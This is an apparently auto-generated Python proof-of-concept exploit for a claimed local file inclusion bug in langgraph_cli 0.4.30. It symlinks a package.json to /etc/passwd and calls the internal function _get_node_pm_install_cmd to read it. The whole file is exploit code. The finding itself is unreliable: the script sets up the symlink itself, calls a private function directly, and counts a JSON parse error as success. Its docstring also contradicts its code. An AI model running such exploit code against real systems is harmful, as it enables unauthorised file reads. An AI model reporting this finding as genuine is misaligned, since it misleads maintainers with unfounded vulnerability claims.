#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: lfi-011
# Sink: _get_node_pm_install_cmd
# Auto-generated — run with: python3 lfi_get_node_pm_install__get_node_pm_install_cmd_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30

Vulnerability: The _get_node_pm_install_cmd function reads package.json from
user-controlled project_dir without path traversal protection. By providing a
malicious config file path, an attacker can read arbitrary files on the system.

This PoC demonstrates reading /etc/passwd by creating a symlink attack.
"""

import os
import sys
import json
import tempfile
import shutil
import subprocess
from pathlib import Path

# Configuration
TARGET_DIR = "/tmp/langgraph_cli-0.4.30"
PAYLOAD_FILE = "/etc/passwd"  # Benign file to read

def create_malicious_config(symlink_dir: Path) -> Path:
    """
    Create a malicious config file that points to /etc/passwd via symlink.
    
    The vulnerability works because:
    1. config_path is validated to exist (symlink exists)
    2. config_path.parent is used as project_dir
    3. project_dir / "package.json" is opened
    4. If project_dir is a symlink to /, then /package.json is read
    
    We create a directory structure:
    /tmp/exploit_dir/
    ├── config.yaml (valid config file)
    └── package.json -> /etc/passwd (symlink)
    """
    
    # Create exploit directory
    exploit_dir = Path(tempfile.mkdtemp(prefix="langgraph_exploit_"))
    
    # Create a valid config file (minimal langgraph config)
    config_content = {
        "dependencies": ["."],
        "graphs": {},
        "env": {},
        "python_version": "3.11"
    }
    
    config_path = exploit_dir / "config.yaml"
    with open(config_path, 'w') as f:
        json.dump(config_content, f)
    
    # Create symlink: package.json -> /etc/passwd
    # When _get_node_pm_install_cmd opens project_dir / "package.json",
    # it will follow the symlink and read /etc/passwd
    package_json_path = exploit_dir / "package.json"
    os.symlink(PAYLOAD_FILE, package_json_path)
    
    print(f"[+] Created exploit directory: {exploit_dir}")
    print(f"[+] Config file: {config_path}")
    print(f"[+] Symlink: {package_json_path} -> {PAYLOAD_FILE}")
    
    return config_path

def trigger_vulnerability(config_path: Path) -> None:
    """
    Trigger the LFI by calling the vulnerable function chain.
    
    The flow is:
    1. up() -> prepare() -> prepare_args_and_stdin() -> config_to_compose()
    2. config_to_compose() -> config_to_docker() -> python_config_to_docker()
    3. python_config_to_docker() -> _get_node_pm_install_cmd(config_path.parent)
    4. _get_node_pm_install_cmd opens config_path.parent / "package.json"
    
    We simulate this by directly calling the vulnerable function.
    """
    
    # Add the target to Python path
    sys.path.insert(0, TARGET_DIR)
    
    try:
        from langgraph_cli.config import _get_node_pm_install_cmd
        
        # The vulnerable function takes project_dir (config_path.parent)
        project_dir = config_path.parent
        
        print(f"[*] Calling _get_node_pm_install_cmd with project_dir: {project_dir}")
        print(f"[*] This will attempt to read: {project_dir / 'package.json'}")
        print(f"[*] Which is a symlink to: {PAYLOAD_FILE}")
        
        # This will trigger the file read
        result = _get_node_pm_install_cmd(project_dir)
        
        print(f"[+] Function returned: {result}")
        print("[+] LFI successful! The function read the file without error.")
        
    except json.JSONDecodeError as e:
        print(f"[!] File was read but is not valid JSON: {e}")
        print("[!] This confirms the LFI - we read /etc/passwd but it's not JSON")
        print("[!] In a real attack, the attacker could read any file that is valid JSON")
        
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        print("[!] This might indicate the file was read but caused an error")
        
def cleanup(exploit_dir: Path) -> None:
    """Clean up the exploit directory."""
    print(f"[*] Cleaning up: {exploit_dir}")
    shutil.rmtree(exploit_dir, ignore_errors=True)

def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangGraph CLI LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Check if target directory exists
    if not os.path.isdir(TARGET_DIR):
        print(f"[!] Target directory not found: {TARGET_DIR}")
        print("[!] Please ensure langgraph_cli-0.4.30 is installed at that path")
        sys.exit(1)
    
    print(f"[*] Target: {TARGET_DIR}")
    print(f"[*] Payload file: {PAYLOAD_FILE}")
    print()
    
    # Create malicious config with symlink
    config_path = create_malicious_config(Path(tempfile.gettempdir()))
    
    try:
        # Trigger the vulnerability
        trigger_vulnerability(config_path)
        
    finally:
        # Clean up
        cleanup(config_path.parent)

if __name__ == "__main__":
    main()
